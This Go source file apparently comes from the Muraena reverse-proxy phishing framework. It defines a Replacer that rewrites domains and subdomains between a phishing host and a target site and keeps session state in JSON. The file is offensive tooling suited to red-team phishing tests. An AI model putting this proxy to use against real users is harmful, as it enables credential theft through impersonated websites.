package proxy

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"regexp"
	"sort"
	"strings"
	"sync"

	"github.com/evilsocket/islazy/tui"

	"github.com/muraenateam/muraena/log"
	"github.com/muraenateam/muraena/session"
)

const CustomWildcardSeparator = "---"
const WildcardLabel = "wld"

// Replacer structure used to populate the transformation rules
type Replacer struct {
	Phishing                      string
	Target                        string
	ExternalOrigin                []string
	ExternalOriginPrefix          string
	Origins                       map[string]string
	WildcardMapping               map[string]string
	SubdomainMap                  [][]string
	CustomResponseTransformations [][]string
	ForwardReplacements           []string `json:"-"`
	ForwardWildcardReplacements   []string `json:"-"`
	BackwardReplacements          []string `json:"-"`
	BackwardWildcardReplacements  []string `json:"-"`
	LastForwardReplacements       []string `json:"-"`
	LastBackwardReplacements      []string `json:"-"`
	WildcardDomain                string   `json:"-"`

	mu sync.RWMutex
}

// GetSessionFileName returns the session file name
// It generates the value from the Target domain, adding session.json at the end
func (r *Replacer) GetSessionFileName() string {
	return fmt.Sprintf("%s.session.json", r.Target)
}

// Init initializes the Replacer struct.
// If session.json is found, it loads the data from it.
// Otherwise, it creates a new Replacer struct.
func (r *Replacer) Init(s session.Session) error {
	if r.Target == "" {
		r.Target = s.Config.Proxy.Target
	}

	err := r.Load()
	if err != nil {
		log.Debug("Error loading replacer: %s", err)
		log.Debug("Creating a new replacer")
	}

	if r.Phishing == "" {
		r.Phishing = s.Config.Proxy.Phishing
	}

	if r.Target == "" {
		r.Target = s.Config.Proxy.Target
	}

	if r.ExternalOriginPrefix == "" {
		r.ExternalOriginPrefix = s.Config.Origins.ExternalOriginPrefix
	}

	r.SubdomainMap = s.Config.Origins.SubdomainMap
	r.SetExternalOrigins(s.Config.Origins.ExternalOrigins)
	r.SetOrigins(s.Config.Origins.OriginsMapping)

	if err = r.DomainMapping(); err != nil {
		return err
	}

	r.SetCustomResponseTransformations(s.Config.Transform.Response.CustomContent)
	r.MakeReplacements()

	// Save the replacer
	err = r.Save()
	if err != nil {
		return fmt.Errorf("error saving replacer: %s", err)
	}

	return nil
}

// WildcardPrefix returns the wildcard prefix used in the transformation rules.
func (r *Replacer) WildcardPrefix() string {
	// XXXwld
	return fmt.Sprintf("%s%s", r.ExternalOriginPrefix, WildcardLabel)
}

// getCustomWildCardSeparator returns the custom wildcard separator used in the transformation rules.
// <CustomWildcardSeparator><ExternalOriginPrefix><WildcardLabel>
func (r *Replacer) getCustomWildCardSeparator() string {
	return fmt.Sprintf("%s%s%s", CustomWildcardSeparator, r.ExternalOriginPrefix, WildcardLabel)
}

// WildcardRegex returns the wildcard regex used in the transformation rules.
// Returns a string in the format [a-zA-Z0-9.-]+.WildcardPrefix()
func (r *Replacer) WildcardRegex(custom bool) string {
	if custom {
		return fmt.Sprintf(`[a-zA-Z0-9\.-]+%s`, r.getCustomWildCardSeparator())
	} else {
		return fmt.Sprintf(`[a-zA-Z0-9\.-]+%s`, r.WildcardPrefix())
	}
}

// SetCustomResponseTransformations sets the CustomResponseTransformations used in the transformation rules.
func (r *Replacer) SetCustomResponseTransformations(newTransformations [][]string) {

	// For each wildcard domain, create a new transformation
	for _, wld := range r.GetWildcardMapping() {
		w := fmt.Sprintf("%s.%s", wld, r.Phishing)

		newTransformations = append(newTransformations, []string{
			fmt.Sprintf("\"%s", w),
			fmt.Sprintf("\"%s%s", CustomWildcardSeparator, w),
		})

		newTransformations = append(newTransformations, []string{
			fmt.Sprintf("\".%s", w),
			fmt.Sprintf("\"%s%s", CustomWildcardSeparator, w),
		})
	}

	r.mu.Lock()
	defer r.mu.Unlock()

	if r.CustomResponseTransformations == nil {
		r.CustomResponseTransformations = newTransformations
		return
	}

	// Create a map to track existing transformations
	existing := make(map[string]struct{})
	for _, t := range r.CustomResponseTransformations {
		// Create a key from the transformation for easy comparison and lookup
		key := strings.Join(t, "|") // You can use a more sophisticated method for generating the key
		existing[key] = struct{}{}
	}

	// Iterate over the new transformations and add them if they don't exist
	for _, nt := range newTransformations {
		key := strings.Join(nt, "|") // Generate the key from the new transformation
		if _, found := existing[key]; !found {
			r.CustomResponseTransformations = append(r.CustomResponseTransformations, nt)
			existing[key] = struct{}{} // Add to the map to ensure uniqueness for future additions
		}
	}

}

// GetExternalOrigins returns the ExternalOrigins used in the transformation rules.
// It returns a copy of the internal slice.
func (r *Replacer) GetExternalOrigins() []string {
	r.mu.Lock()
	defer r.mu.Unlock()

	// Make a copy of the ExternalOrigins and return it
	ret := make([]string, len(r.ExternalOrigin))
	copy(ret, r.ExternalOrigin)

	return ret
}

// SetExternalOrigins sets the ExternalOrigins used in the transformation rules.
func (r *Replacer) SetExternalOrigins(origins []string) {
	r.mu.Lock()

	if r.ExternalOrigin == nil {
		r.ExternalOrigin = make([]string, 0)
	}

	// merge origins to r.ExternalOrigin and avoid duplicate
	for _, v := range ArmorDomain(origins) {
		v = strings.TrimPrefix(v, ".")
		if strings.Contains(v, r.getCustomWildCardSeparator()) {
			continue
		}

		// if r.ExternalOrigin does not contain v, append it
		if !contains(r.ExternalOrigin, v) {
			log.Info("[*] New origin %v", tui.Green(v))
			r.ExternalOrigin = append(r.ExternalOrigin, v)
		}
	}

	r.ExternalOrigin = ArmorDomain(r.ExternalOrigin)

	r.mu.Unlock()
	r.MakeReplacements()

}

// GetOrigins returns the Origins mapping used in the transformation rules.
// It returns a copy of the internal map.
func (r *Replacer) GetOrigins() map[string]string {
	r.mu.Lock()

	// Make a copy of the Origins and return it
	ret := make(map[string]string)
	for k, v := range r.Origins {
		ret[k] = v
	}

	r.mu.Unlock()

	return ret
}

// SetOrigins sets the Origins mapping used in the transformation rules.
func (r *Replacer) SetOrigins(newOrigins map[string]string) {

	if len(newOrigins) == 0 {
		return
	}

	if r.Origins == nil {
		r.Origins = make(map[string]string)
	}

	r.mu.Lock()
	defer r.mu.Unlock()

	// merge newOrigins to r.newOrigins and avoid duplicate

	// count the number of new origins
	count := len(r.Origins)
	for k, v := range newOrigins {
		k = strings.ToLower(k)
		if v == "-1" {
			count++
			v = fmt.Sprintf("%d", count)
		}
		r.Origins[k] = v
	}
}

// SetForwardReplacements sets the ForwardReplacements used in the transformation rules.
func (r *Replacer) SetForwardReplacements(replacements []string) {
	r.mu.Lock()
	defer r.mu.Unlock()

	r.ForwardReplacements = replacements
}

// SetForwardWildcardReplacements sets the ForwardWildcardReplacements used in the transformation rules.
func (r *Replacer) SetForwardWildcardReplacements(replacements []string) {
	r.mu.Lock()
	defer r.mu.Unlock()

	r.ForwardWildcardReplacements = replacements
}

// SetBackwardReplacements sets the BackwardReplacements used in the transformation rules.
func (r *Replacer) SetBackwardReplacements(replacements []string) {
	r.mu.Lock()
	defer r.mu.Unlock()

	r.BackwardReplacements = replacements
}

// SetBackwardWildcardReplacements sets the BackwardWildcardReplacements used in the transformation rules.
func (r *Replacer) SetBackwardWildcardReplacements(replacements []string) {
	r.mu.Lock()
	defer r.mu.Unlock()

	r.BackwardWildcardReplacements = replacements
}

// SetLastForwardReplacements sets the LastForwardReplacements used in the transformation rules.
func (r *Replacer) SetLastForwardReplacements(replacements []string) {
	r.mu.Lock()
	defer r.mu.Unlock()

	r.LastForwardReplacements = replacements
}

// SetLastBackwardReplacements sets the LastBackwardReplacements used in the transformation rules.
func (r *Replacer) SetLastBackwardReplacements(replacements []string) {
	r.mu.Lock()
	defer r.mu.Unlock()

	r.LastBackwardReplacements = replacements
}

// GetWildcardMapping returns the WildcardMapping used in the transformation rules.
// It returns a copy of the internal map.
func (r *Replacer) GetWildcardMapping() map[string]string {
	r.mu.Lock()

	// Make a copy of the WildcardMapping and return it
	ret := make(map[string]string)
	for k, v := range r.WildcardMapping {
		ret[k] = v
	}

	r.mu.Unlock()

	return ret
}

// SetWildcardMapping sets the WildcardMapping used in the transformation rules.
func (r *Replacer) SetWildcardMapping(domain, mapping string) {
	r.mu.Lock()
	defer r.mu.Unlock()

	r.WildcardMapping[domain] = mapping
}

// SetWildcardDomain sets the WildcardDomain used in the transformation rules.
func (r *Replacer) SetWildcardDomain(domain string) {
	r.mu.Lock()
	defer r.mu.Unlock()

	r.WildcardDomain = domain
}

// Contains checks if a string is contained in a slice.
func contains(slice []string, s string) bool {
	for _, v := range slice {
		if v == s {
			return true
		}
	}
	return false
}

// Save saves the Replacer struct to a file as JSON.
func (r *Replacer) Save() error {
	r.mu.Lock()
	defer r.mu.Unlock()

	return saveToJSON(r.GetSessionFileName(), r)
}

// saveToJSON saves the Replacer struct to a file as JSON.
func saveToJSON(filename string, replacer *Replacer) error {
	data, err := json.MarshalIndent(replacer, "", "\t")
	if err != nil {
		return err
	}
	return ioutil.WriteFile(filename, data, 0644)
}

// Load loads the Replacer data from a JSON file.
func (r *Replacer) Load() error {
	rep, err := loadFromJSON(r.GetSessionFileName())
	if err != nil {
		return err
	}

	// update the current replacer pointer
	*r = *rep
	return nil
}

// loadFromJSON loads the Replacer data from a JSON file.
func loadFromJSON(filename string) (*Replacer, error) {
	data, err := ioutil.ReadFile(filename)
	if err != nil {
		return nil, err
	}
	var replacer Replacer
	if err := json.Unmarshal(data, &replacer); err != nil {
		return nil, err
	}

	return &replacer, nil
}

type replacement struct {
	OldVal string
	NewVal string
}

// GetBackwardReplacements returns the BackwardReplacements used in the transformation rules.
// It returns a copy of the internal slice sorted by length in descending order.
func (r *Replacer) GetBackwardReplacements() []string {
	r.mu.Lock()
	defer r.mu.Unlock()

	return sortReplacementsByLength(r.BackwardReplacements, false)
}

// GetForwardReplacements returns the ForwardReplacements used in the transformation rules.
// It returns a copy of the internal slice sorted by length in descending order.
func (r *Replacer) GetForwardReplacements() []string {
	r.mu.Lock()
	defer r.mu.Unlock()

	return append(
		sortReplacementsByLength(r.ForwardReplacements, true),
		sortReplacementsByLength(r.ForwardWildcardReplacements, true)...,
	)
}

// GetLastForwardReplacements returns the LastForwardReplacements used in the transformation rules.
// It returns a copy of the internal slice sorted by length in descending order.
func (r *Replacer) GetLastForwardReplacements() []string {
	r.mu.Lock()
	defer r.mu.Unlock()

	return sortReplacementsByLength(r.LastForwardReplacements, true)
}

// GetLastBackwardReplacements returns the LastBackwardReplacements used in the transformation rules.
// It returns a copy of the internal slice sorted by length in descending order.
func (r *Replacer) GetLastBackwardReplacements() []string {
	r.mu.Lock()
	defer r.mu.Unlock()

	return append(
		sortReplacementsByLength(r.LastBackwardReplacements, false),
		sortReplacementsByLength(r.BackwardWildcardReplacements, false)...,
	)
}

// caseInsensitiveReplace replaces the old values with the new values in the input string.
func caseInsensitiveReplace(input string, r []string) (string, error) {
	replacements, err := convertToReplacements(r)
	if err != nil {
		return "", err
	}

	for _, r := range replacements {
		re, err := regexp.Compile(`(?i)` + regexp.QuoteMeta(r.OldVal))
		if err != nil {
			return "", err
		}
		input = re.ReplaceAllString(input, r.NewVal)
	}
	return input, nil
}

// convertToReplacements converts a slice of strings to a slice of replacements.
func convertToReplacements(slice []string) ([]replacement, error) {
	if len(slice)%2 != 0 {
		return nil, fmt.Errorf("slice must have an even number of elements")
	}

	var replacements []replacement
	for i := 0; i < len(slice); i += 2 {
		replacements = append(replacements, replacement{
			OldVal: slice[i],
			NewVal: slice[i+1],
		})
	}

	return replacements, nil
}

// sortReplacementsByLength sorts the replacements by length in descending order.
func sortReplacementsByLength(r []string, forward bool) (new []string) {

	replacements, err := convertToReplacements(r)
	if err != nil {
		log.Warning("Error converting replacements: %s", err)
		return
	}

	if forward {
		sort.Slice(replacements, func(i, j int) bool {
			return len(replacements[i].NewVal) > len(replacements[j].NewVal)
		})
	} else {
		sort.Slice(replacements, func(i, j int) bool {
			return len(replacements[i].OldVal) > len(replacements[j].OldVal)
		})
	}

	// convert replacements back to a slice of strings
	new = make([]string, 0)
	for _, rr := range replacements {
		new = append(new, rr.OldVal, rr.NewVal)
	}

	return
}
